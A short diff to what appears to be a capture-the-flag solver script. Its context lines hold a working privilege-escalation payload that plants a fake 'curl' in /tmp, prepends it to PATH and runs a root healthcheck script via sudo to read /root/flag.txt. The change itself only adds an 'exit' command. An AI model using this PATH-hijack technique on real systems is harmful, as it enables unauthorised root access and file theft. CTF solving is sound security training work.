@@ -41,6 +41,7 @@ def exploit(target, portSpawnShell):
     r.sendline(b"mkdir /tmp/fakebin;echo -e '#!/bin/bash\ncat /root/flag.txt' > /tmp/fakebin/curl;chmod +x /tmp/fakebin/curl;PATH=/tmp/fakebin:$PATH sudo /opt/healthcheck.sh")
     r.recvuntil(b"status code ")
     flag = r.recvline().strip().decode().replace("}.", "}")
+    r.sendline(b"exit")
     r.close()
     
     if FLAG_FORMAT not in flag:
